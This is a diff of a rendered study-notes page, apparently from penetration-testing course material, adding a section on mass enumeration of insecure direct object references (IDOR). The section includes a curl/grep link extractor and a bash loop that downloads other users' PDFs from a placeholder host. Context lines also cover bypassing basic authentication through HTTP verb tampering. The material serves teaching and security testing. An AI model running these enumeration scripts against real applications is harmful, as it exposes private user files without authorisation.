@@ -39,10 +39,10 @@
             const path_to_root = "";
             const default_light_theme = "light";
             const default_dark_theme = "navy";
-            window.path_to_searchindex_js = "searchindex-9f1c01d6.js";
+            window.path_to_searchindex_js = "searchindex-98784f48.js";
         </script>
         <!-- Start loading toc.js asap -->
-        <script src="toc-995102f7.js"></script>
+        <script src="toc-829beffb.js"></script>
     </head>
     <body>
     <div id="mdbook-help-container">
@@ -28162,6 +28162,7 @@ $result = $conn-&gt;query($query);
 <li><a href="#http-verb-tampering--prevention">HTTP Verb Tampering — prevention — insecure config fixes (Apache, Tomcat, ASP.NET), insecure coding fixes</a></li>
 <li><a href="#intro-to-idor">Intro to IDOR — what it is, why common, impact (disclosure, modification, privilege escalation), attack pattern</a></li>
 <li><a href="#identifying-idors">Identifying IDORs — URL params, AJAX calls, encoded/hashed references, comparing user roles</a></li>
+<li><a href="#idor--mass-enumeration">IDOR mass enumeration — insecure parameters, static file IDOR, parameter-based IDOR, bulk download scripting</a></li>
 </ul>
 <h2 id="summary-11"><a class="header" href="#summary-11">Summary</a></h2>
 <p>Web attacks are the most common class of attacks against businesses, targeting external-facing applications, internal web apps, and API endpoints alike. This section covers three attack types found across many web applications. <strong>HTTP Verb Tampering</strong> exploits servers that accept unexpected HTTP methods, allowing attackers to bypass authorization mechanisms and security controls by sending requests with non-standard verbs. <strong>Insecure Direct Object References (IDOR)</strong> exploit weak or missing back-end access controls: when applications use predictable identifiers (sequential IDs, user numbers) to reference resources, an attacker can guess or calculate valid IDs to access other users’ data. <strong>XML External Entity (XXE) Injection</strong> targets applications using outdated XML parsers to process user-supplied XML — malicious payloads can read local files (configs, source code, credentials), enable whitebox testing, steal server credentials, and potentially achieve remote code execution.</p>
@@ -28170,6 +28171,7 @@ $result = $conn-&gt;query($query);
 <p><strong>Bypassing basic authentication</strong> via verb tampering follows a short process: identify the restricted page/directory, intercept the request, try switching GET → POST (if also blocked, move on), send an <code>OPTIONS</code> request to enumerate accepted methods (<code>curl -i -X OPTIONS http://TARGET/</code>), then try <code>HEAD</code>. Because <code>HEAD</code> is accepted by default on most servers and is often excluded from <code>&lt;Limit&gt;</code> blocks, it bypasses the auth prompt while still executing the server-side action — the empty response body is expected behavior, not a failure. Verify success by checking application state rather than response content.</p>
 <p><strong>IDOR</strong> vulnerabilities arise when a web application exposes direct references to internal objects (file IDs, database records, API paths) <strong>without back-end access control</strong> validating that the requesting user is authorized. The reference itself is not the flaw — the missing authorization check is. Impact ranges from <strong>information disclosure</strong> (reading other users’ files/PII) to <strong>data modification/account takeover</strong> (write-capable references) to <strong>privilege escalation</strong> (calling admin-only API endpoints that the back-end fails to restrict to admin roles). IDOR is pervasive because access control is inherently hard to build, hard to automate testing for, and frequently skipped by developers who rely on front-end logic alone.</p>
 <p><strong>Identifying IDORs</strong> starts with spotting direct object references in URL parameters (<code>?uid=1</code>), API paths, cookies, or headers, then incrementing/fuzzing values to check for unauthorized access. Front-end JavaScript AJAX calls may reveal hidden endpoints and parameters (including admin functions disabled client-side but present in source). <strong>Encoded</strong> references (Base64) can be decoded, modified, and re-encoded; <strong>hashed</strong> references can often be reproduced by finding the algorithm in front-end source (e.g., <code>CryptoJS.MD5(filename)</code>) or identifying the hash type. Registering <strong>multiple accounts</strong> and comparing their HTTP requests reveals how identifiers are calculated and whether the back-end validates the caller’s session against the requested resource.</p>
+<p><strong>Mass enumeration</strong> automates IDOR exploitation at scale. <strong>Static file IDORs</strong> embed the user ID in predictable filenames (<code>Invoice_1_09_2021.pdf</code>); <strong>parameter-based IDORs</strong> pass the UID directly in a query string (<code>?uid=1</code>) — always check linked file URLs and page source since the UI may look identical across different UIDs. Extract document links with <code>curl</code> + regex (<code>grep -oP "\/documents.*?.pdf"</code>), then loop over UID ranges with a bash script using <code>wget</code>, or use Burp Intruder / ZAP Fuzzer for the same result.</p>
 <div style="break-before: page; page-break-before: always;"></div>
 <h1 id="http-verb-tampering--bypassing-basic-authentication"><a class="header" href="#http-verb-tampering--bypassing-basic-authentication">HTTP Verb Tampering — Bypassing Basic Authentication</a></h1>
 <p>Exploiting insecure server configuration verb tampering is straightforward: try alternate HTTP methods and observe how the server handles them. Automated scanners catch this type reliably (auth bypass is obvious once it works), but miss the insecure-coding variant, which requires active testing.</p>
@@ -28481,6 +28483,52 @@ if (preg_match($pattern, $_GET["code"])) {
 <li>Map the reference pattern and enumerate systematically</li>
 <li>Determine whether the access is read-only (disclosure) or read-write (modification/deletion)</li>
 </ol>
+<div style="break-before: page; page-break-before: always;"></div>
+<h1 id="idor--mass-enumeration"><a class="header" href="#idor--mass-enumeration">IDOR — Mass Enumeration</a></h1>
+<h2 id="insecure-parameters"><a class="header" href="#insecure-parameters">Insecure parameters</a></h2>
+<p>The most basic IDOR pattern: a URL parameter like <code>?uid=1</code> directly controls which user’s data is returned. If the back-end does not validate that the requesting user is authorized to view that UID’s records, changing the value exposes other users’ data.</p>
+<h3 id="static-file-idor"><a class="header" href="#static-file-idor">Static file IDOR</a></h3>
+<p>File links may embed the user ID in a predictable naming pattern:</p>
+<pre><code>/documents/Invoice_1_09_2021.pdf
+/documents/Report_1_10_2021.pdf
+</code></pre>
+<p>Fuzzing other IDs (<code>Invoice_2_...</code>, <code>Invoice_3_...</code>) can retrieve other users’ files, but requires guessing the file prefix — not always reliable.</p>
+<h3 id="parameter-based-idor"><a class="header" href="#parameter-based-idor">Parameter-based IDOR</a></h3>
+<p>A more reliable approach: manipulate the UID parameter directly:</p>
+<pre><code>/documents.php?uid=1  →  /documents.php?uid=2
+</code></pre>
+<p><strong>Key detail:</strong> the page layout may look identical for different UIDs. Always check the <strong>linked file URLs</strong> or <strong>page source</strong> — the file paths will differ even when the UI appears unchanged.</p>
+<p>Other variations:</p>
+<ul>
+<li>Filter parameters: <code>?uid_filter=1</code> — manipulate or remove entirely to show all records</li>
+<li>The parameter being in clear text in the URL is itself a design smell suggesting missing access control</li>
+</ul>
+<h2 id="mass-enumeration"><a class="header" href="#mass-enumeration">Mass enumeration</a></h2>
+<p>Manually iterating UIDs is impractical at scale. Automate with Burp Intruder, ZAP Fuzzer, or a script.</p>
+<h3 id="extracting-document-links"><a class="header" href="#extracting-document-links">Extracting document links</a></h3>
+<p>Inspect the page source to find a unique pattern around file links:</p>
+<pre><code class="language-html">&lt;li class='pure-tree_link'&gt;&lt;a href='/documents/Invoice_3_06_2020.pdf' target='_blank'&gt;Invoice&lt;/a&gt;&lt;/li&gt;
+</code></pre>
+<p>Use <code>curl</code> + <code>grep</code> with a regex to extract just the file paths:</p>
+<pre><code class="language-bash">curl -s "http://TARGET/documents.php?uid=3" | grep -oP "\/documents.*?.pdf"
+</code></pre>
+<p>Output:</p>
+<pre><code>/documents/Invoice_3_06_2020.pdf
+/documents/Report_3_01_2020.pdf
+</code></pre>
+<h3 id="bulk-download-script"><a class="header" href="#bulk-download-script">Bulk download script</a></h3>
+<p>Loop over UIDs, extract links, and download each file:</p>
+<pre><code class="language-bash">#!/bin/bash
+
+url="http://SERVER_IP:PORT"
+
+for i in {1..10}; do
+    for link in $(curl -s "$url/documents.php?uid=$i" | grep -oP "\/documents.*?.pdf"); do
+        wget -q "$url/$link"
+    done
+done
+</code></pre>
+<p>Adjust the UID range based on the target. Alternatives: Burp Intruder (payload positions on the UID parameter) or ZAP Fuzzer for the same effect without scripting.</p>
 <div style="break-before: page; page-break-before: always;"></div>
 <h1 id="introduction-to-web-attacks"><a class="header" href="#introduction-to-web-attacks">Introduction to Web Attacks</a></h1>
 <h2 id="why-web-attacks-matter"><a class="header" href="#why-web-attacks-matter">Why web attacks matter</a></h2>
